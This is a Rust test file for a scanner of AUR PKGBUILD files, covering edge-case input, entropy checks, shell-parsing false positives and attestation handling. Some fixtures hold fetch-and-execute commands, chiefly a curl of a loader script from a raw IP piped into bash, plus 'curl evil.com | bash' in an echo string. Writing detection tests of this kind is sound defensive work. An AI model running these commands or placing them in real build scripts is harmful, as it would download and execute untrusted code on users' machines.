mod common;

use aur_sentry::analyzer::shannon_entropy;
use aur_sentry::attest::{AttestInputs, build_attestation};
use aur_sentry::attestation::{ReproducibilityStatus, Verdict};
use aur_sentry::scanner::PKGBUILDScanner;
use aur_sentry::shellparse;
use common::*;

// =========================================================================
// 1. Input Degeneracy & Edge Boundaries
// =========================================================================

#[test]
fn test_boundary_zero_byte_pkgbuild() {
    let sandbox = TestSandbox::new("tier2_zero_byte");
    let empty_file = sandbox.write_file("PKGBUILD", "");

    let output = run_aur_sentry(&["scan-file", empty_file.to_str().unwrap()]);
    assert_eq!(
        output.code(),
        Some(0),
        "0-byte file must exit 0 without panic"
    );
    assert!(output.stderr.contains("clean"));

    let scanner = PKGBUILDScanner::new();
    let findings = scanner.scan("", None);
    assert!(findings.is_empty());
}

#[test]
fn test_boundary_whitespace_only_pkgbuild() {
    let sandbox = TestSandbox::new("tier2_whitespace");
    let file = sandbox.write_file("PKGBUILD", "   \n\t\n  \r\n   \n");

    let output = run_aur_sentry(&["scan-file", file.to_str().unwrap()]);
    assert_eq!(output.code(), Some(0));

    let scanner = PKGBUILDScanner::new();
    let findings = scanner.scan("   \n\t\n  \r\n   \n", None);
    assert!(findings.is_empty());
}

#[test]
fn test_boundary_single_line_without_trailing_newline() {
    let sandbox = TestSandbox::new("tier2_no_newline");
    let file = sandbox.write_file("PKGBUILD", "pkgname=single-line-test");

    let output = run_aur_sentry(&["scan-file", file.to_str().unwrap()]);
    assert_eq!(output.code(), Some(0));

    let scanner = PKGBUILDScanner::new();
    let findings = scanner.scan("pkgname=single-line-test", None);
    assert!(findings.is_empty());
}

#[test]
fn test_boundary_huge_single_line_input() {
    let sandbox = TestSandbox::new("tier2_huge_line");
    // 64 KB repetitive line
    let huge_line = format!("pkgname=test\n# {}", "A".repeat(65536));
    let file = sandbox.write_file("PKGBUILD", &huge_line);

    let output = run_aur_sentry(&["scan-file", file.to_str().unwrap()]);
    assert_eq!(output.code(), Some(0));

    let scanner = PKGBUILDScanner::new();
    let findings = scanner.scan(&huge_line, None);
    assert!(findings.is_empty());
}

#[test]
fn test_boundary_multibyte_utf8_char_boundaries() {
    let sandbox = TestSandbox::new("tier2_utf8");
    // Contains Japanese, Cyrillic, emojis, math symbols, smart quotes
    let utf8_content = r#"
# Maintainer: 🦀 Rustacéen <rust@example.org>
# 説明: 日本語のコメントテスト
# Описание: Проверка русских символов
# Quotes: “smart quotes” and ‘single’ and €500 or ¥1000
pkgname=utf8-package-🦀
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
"#;
    let file = sandbox.write_file("PKGBUILD", utf8_content);

    let output = run_aur_sentry(&["scan-file", file.to_str().unwrap()]);
    assert_eq!(
        output.code(),
        Some(0),
        "Multi-byte UTF8 must never cause char boundary slicing panic"
    );

    let scanner = PKGBUILDScanner::new();
    let findings = scanner.scan(utf8_content, None);
    assert!(findings.is_empty());
}

#[test]
fn test_boundary_utf8_slicing_on_long_matched_lines() {
    let scanner = PKGBUILDScanner::new();
    // Non-ASCII text surrounding a malicious payload in active code that triggers snippet truncation (>120 chars)
    let long_utf8_line = format!(
        "echo \"日本語の長いテキスト 日本語の長いテキスト 日本語の長いテキスト\" && curl -s http://194.26.29.112/loader.sh | bash # {}",
        "🦀".repeat(50)
    );
    let findings = scanner.scan(&long_utf8_line, None);
    assert!(
        findings.iter().any(|f| f.rule_id == "EXFIL_RAW_IP"),
        "Must detect raw IP finding despite multi-byte UTF8 surrounding text"
    );
}

#[test]
fn test_boundary_ansi_escape_code_injection() {
    let sandbox = TestSandbox::new("tier2_ansi_inject");
    let malicious_ansi = "pkgname=ansi-test\n# \x1b[31mRED ALERT\x1b[0m\nbuild() { echo 'hi'; }\n";
    let file = sandbox.write_file("PKGBUILD", malicious_ansi);

    let output = run_aur_sentry(&["scan-file", file.to_str().unwrap(), "--json"]);
    assert_eq!(output.code(), Some(0));
    assert!(
        !output.stdout.contains("\x1b[31m"),
        "JSON output must not reflect raw ANSI control codes"
    );
}

#[test]
fn test_boundary_path_traversal_in_filename() {
    let sandbox = TestSandbox::new("tier2_traversal");
    let nested = sandbox.root.join("nested").join("dir");
    std::fs::create_dir_all(&nested).unwrap();

    let _pkgbuild = sandbox.write_file("nested/dir/PKGBUILD", BENIGN_MINIMAL_PKGBUILD);
    let traversal_path = format!("{}/../../nested/dir/PKGBUILD", nested.display());

    let output = run_aur_sentry(&["scan-file", &traversal_path]);
    assert_eq!(output.code(), Some(0));
}

#[test]
fn test_boundary_special_characters_in_pkgname() {
    let scanner = PKGBUILDScanner::new();
    let content = "pkgname=lib32-compat_pkg.v2-plus\npkgver=1.0\n";
    let findings = scanner.scan(content, Some("lib32-compat_pkg.v2-plus"));
    assert!(findings.is_empty());
}

// =========================================================================
// 2. Shannon Entropy Boundaries & Whitelist Rules
// =========================================================================

#[test]
fn test_boundary_entropy_zero_bits_for_repetitive_sequence() {
    let uniform = "A".repeat(1000);
    let h = shannon_entropy(&uniform);
    assert_eq!(
        h, 0.0,
        "Uniform byte sequence must have exactly 0.0 entropy"
    );
}

#[test]
fn test_boundary_entropy_natural_code_below_threshold() {
    let natural_code = "function calculate_sum(a, b) { return a + b; }";
    let h = shannon_entropy(natural_code);
    assert!(
        h < 4.5,
        "Natural shell/C code should have entropy < 4.5, got {h}"
    );
}

#[test]
fn test_boundary_entropy_high_encrypted_base64_payload() {
    // Highly scrambled random bytes base64 encoded
    let high_entropy_str = "k8vN91xK+J82zL0mP4wQ6rT3uS5aD1fG2hJ4kL6nB8=";
    let h = shannon_entropy(high_entropy_str);
    assert!(
        h > 4.8,
        "Scrambled/encrypted payload should exceed 4.8 bits/byte, got {h}"
    );
}

#[test]
fn test_boundary_entropy_whitelist_sha256_hex_hash() {
    let scanner = PKGBUILDScanner::new();
    let content = r#"
pkgname=hex-test
pkgver=1.0
sha256sums=('4b37344f6f7aa5394fb0e1ea7a6c9cf1c260be562f790c5fae46127bcfeb523a')
"#;
    let findings = scanner.scan(content, None);
    assert!(
        !findings.iter().any(|f| f.rule_id == "SUS_HIGH_ENTROPY"),
        "Standard 64-char SHA256 hex string must not trigger high entropy warning"
    );
}

#[test]
fn test_boundary_entropy_whitelist_sha512_hex_hash() {
    let scanner = PKGBUILDScanner::new();
    let content = r#"
pkgname=hex-test
pkgver=1.0
sha512sums=('cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e')
"#;
    let findings = scanner.scan(content, None);
    assert!(
        !findings.iter().any(|f| f.rule_id == "SUS_HIGH_ENTROPY"),
        "Standard 128-char SHA512 hex string must not trigger high entropy warning"
    );
}

#[test]
fn test_boundary_entropy_whitelist_b2_hex_hash() {
    let scanner = PKGBUILDScanner::new();
    let content = r#"
pkgname=b2-test
pkgver=1.0
b2sums=('09a250325434ad3ee255b7cb826d4002621ec84e3ceec8b045e3c79cff541cfa28eef606689d0b64d4b1f41604a1b0ad3a94ed05f639316d267882fb5a49ca38')
"#;
    let findings = scanner.scan(content, None);
    assert!(
        !findings.iter().any(|f| f.rule_id == "SUS_HIGH_ENTROPY"),
        "BLAKE2b sums must not trigger high entropy warning"
    );
}

// =========================================================================
// 3. Shell Parsing Edge Cases & False Positive Avoidance
// =========================================================================

#[test]
fn test_boundary_shell_nested_command_substitutions() {
    let script = "RESULT=$(echo $(echo $(echo 'clean text')))";
    let stages = shellparse::pipeline_stages(script);
    assert!(!stages.is_empty(), "Must successfully parse nested stages");
}

#[test]
fn test_boundary_shell_escaped_quotes_inside_double_quotes() {
    let script = r#"echo "nested \"quoted string\" test""#;
    let stages = shellparse::pipeline_stages(script);
    assert_eq!(stages.len(), 1);
}

#[test]
fn test_boundary_shell_single_quoted_safe_string() {
    let scanner = PKGBUILDScanner::new();
    // Mentioning dangerous phrase in an echo single-quote literal is NOT a live execution
    let script = r#"echo 'To install, do not run curl evil.com | bash'"#;
    let findings = scanner.scan(script, None);
    assert!(
        !findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"),
        "Literal string in echo argument must not trigger PIPELINE_FETCH_EXEC"
    );
}

#[test]
fn test_boundary_shell_comment_mentioning_curl_pipe() {
    let scanner = PKGBUILDScanner::new();
    let script = r#"
# Instructions:
# curl -sSL https://example.com/install.sh | bash
pkgname=my-package
pkgver=1.0
"#;
    let findings = scanner.scan(script, None);
    assert!(
        !findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"),
        "Commented-out curl | bash must not trigger pipeline execution finding"
    );
}

#[test]
fn test_boundary_shell_variable_substring_name() {
    let scanner = PKGBUILDScanner::new();
    let script = r#"
curl_timeout=30
bash_completion_dir="/usr/share/bash-completion"
"#;
    let findings = scanner.scan(script, None);
    assert!(
        !findings.iter().any(|f| f.rule_id == "EXFIL_CURL_PIPE_EXEC"),
        "Variable names containing 'curl' or 'bash' substrings must not trigger pipeline rules"
    );
}

#[test]
fn test_boundary_shell_heredoc_multiline_block() {
    let scanner = PKGBUILDScanner::new();
    let script = r#"
cat << 'EOF' > test.conf
[Section]
key = value
comment = curl and bash
EOF
"#;
    let findings = scanner.scan(script, None);
    assert!(
        !findings.iter().any(|f| f.rule_id == "EXFIL_CURL_PIPE_EXEC"),
        "Heredoc content must not trigger false positive curl execution"
    );
}

#[test]
fn test_boundary_shell_curl_download_to_file_not_piped_to_shell() {
    let scanner = PKGBUILDScanner::new();
    // curl writing to file with -o or -O
    let script = "curl -fsSL -o /tmp/file.tar.gz https://example.com/file.tar.gz";
    let findings = scanner.scan(script, None);
    assert!(
        !findings.iter().any(|f| f.rule_id == "EXFIL_CURL_PIPE_EXEC"),
        "curl -o must not trigger pipe execution"
    );
}

// =========================================================================
// 4. Missing Fields & Malformed Metadata / Telemetry
// =========================================================================

#[test]
fn test_boundary_attest_empty_static_findings_json() {
    let sandbox = TestSandbox::new("tier2_attest_empty");
    let static_file = sandbox.write_file("static.json", "[]");

    let inputs = AttestInputs {
        package: "empty-findings-pkg".into(),
        version: "1.0.0-1".into(),
        arch: "x86_64".into(),
        aur_commit: "".into(),
        pkgbuild_path: None,
        install_path: None,
        static_findings_path: Some(&static_file),
        telemetry_path: None,
        install_telemetry_path: None,
        package_analysis_path: None,
        external_intelligence_path: None,
        strace_available: false,
        makepkg_exit: Some(0),
        scanner_version: "0.1.0".into(),
        reproducibility: ReproducibilityStatus::NotAttempted,
    };

    let att = build_attestation(&inputs);
    assert_eq!(att.verdict, Verdict::Verified);
    assert!(att.static_findings.is_empty());
}

#[test]
fn test_boundary_attest_malformed_static_findings_json() {
    let sandbox = TestSandbox::new("tier2_attest_corrupt");
    let corrupt_file = sandbox.write_file("static.json", "{ not valid json ... !!!");

    let inputs = AttestInputs {
        package: "corrupt-findings-pkg".into(),
        version: "1.0.0-1".into(),
        arch: "x86_64".into(),
        aur_commit: "".into(),
        pkgbuild_path: None,
        install_path: None,
        static_findings_path: Some(&corrupt_file),
        telemetry_path: None,
        install_telemetry_path: None,
        package_analysis_path: None,
        external_intelligence_path: None,
        strace_available: false,
        makepkg_exit: Some(0),
        scanner_version: "0.1.0".into(),
        reproducibility: ReproducibilityStatus::NotAttempted,
    };

    // Should degrade gracefully to empty findings without panic
    let att = build_attestation(&inputs);
    assert_eq!(att.verdict, Verdict::Verified);
    assert!(att.static_findings.is_empty());
}

#[test]
fn test_boundary_attest_truncated_or_garbage_telemetry_log() {
    let sandbox = TestSandbox::new("tier2_telemetry_corrupt");
    let telemetry_content = r#"
12345 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
GARBAGE LINE WITHOUT SYSCALL
99999 [unfinished ...]
BINARY_JUNK \x00\x01\x02\xFF
"#;
    let telem_file = sandbox.write_file("telemetry.log", telemetry_content);

    let inputs = AttestInputs {
        package: "corrupt-telemetry-pkg".into(),
        version: "1.0.0-1".into(),
        arch: "x86_64".into(),
        aur_commit: "".into(),
        pkgbuild_path: None,
        install_path: None,
        static_findings_path: None,
        telemetry_path: Some(&telem_file),
        install_telemetry_path: None,
        package_analysis_path: None,
        external_intelligence_path: None,
        strace_available: true,
        makepkg_exit: Some(0),
        scanner_version: "0.1.0".into(),
        reproducibility: ReproducibilityStatus::NotAttempted,
    };

    let att = build_attestation(&inputs);
    assert_eq!(att.verdict, Verdict::Verified);
}

#[test]
fn test_boundary_attest_missing_telemetry_file_when_strace_flag_true() {
    let non_existent = std::path::Path::new("/nonexistent/telemetry.log");

    let inputs = AttestInputs {
        package: "missing-telemetry-pkg".into(),
        version: "1.0.0-1".into(),
        arch: "x86_64".into(),
        aur_commit: "".into(),
        pkgbuild_path: None,
        install_path: None,
        static_findings_path: None,
        telemetry_path: Some(non_existent),
        install_telemetry_path: None,
        package_analysis_path: None,
        external_intelligence_path: None,
        strace_available: true,
        makepkg_exit: Some(0),
        scanner_version: "0.1.0".into(),
        reproducibility: ReproducibilityStatus::NotAttempted,
    };

    // Degrades gracefully to empty telemetry
    let att = build_attestation(&inputs);
    assert_eq!(att.verdict, Verdict::Verified);
    assert!(att.dynamic_evidence.network.is_empty());
}

#[test]
fn test_boundary_attest_negative_or_signal_makepkg_exit_code() {
    let inputs = AttestInputs {
        package: "failed-build-pkg".into(),
        version: "1.0.0-1".into(),
        arch: "x86_64".into(),
        aur_commit: "".into(),
        pkgbuild_path: None,
        install_path: None,
        static_findings_path: None,
        telemetry_path: None,
        install_telemetry_path: None,
        package_analysis_path: None,
        external_intelligence_path: None,
        strace_available: false,
        makepkg_exit: Some(-9), // e.g. killed by SIGKILL
        scanner_version: "0.1.0".into(),
        reproducibility: ReproducibilityStatus::NotAttempted,
    };

    let att = build_attestation(&inputs);
    assert_eq!(
        att.verdict,
        Verdict::BuildFailed,
        "Negative makepkg_exit must produce BuildFailed verdict"
    );
}

#[test]
fn test_boundary_attest_case_insensitive_reproducibility() {
    assert_eq!(
        ReproducibilityStatus::from_cli_str("reproduced"),
        ReproducibilityStatus::Reproduced
    );
    assert_eq!(
        ReproducibilityStatus::from_cli_str("FAILED"),
        ReproducibilityStatus::Failed
    );
    assert_eq!(
        ReproducibilityStatus::from_cli_str("Diverged"),
        ReproducibilityStatus::Diverged
    );
    assert_eq!(
        ReproducibilityStatus::from_cli_str("unknown_status_xyz"),
        ReproducibilityStatus::NotAttempted
    );
}

#[test]
fn test_boundary_check_remote_handles_missing_or_offline_cleanly() {
    // Arbitrary unknown package must exit 0 and not fail the user's build command
    let output = run_aur_sentry(&["check", "definitely-does-not-exist-in-aur-sentry-123456789"]);
    assert_eq!(
        output.code(),
        Some(0),
        "check on nonexistent package must exit 0"
    );
    assert!(output.stderr.contains("No attestation found"));
}
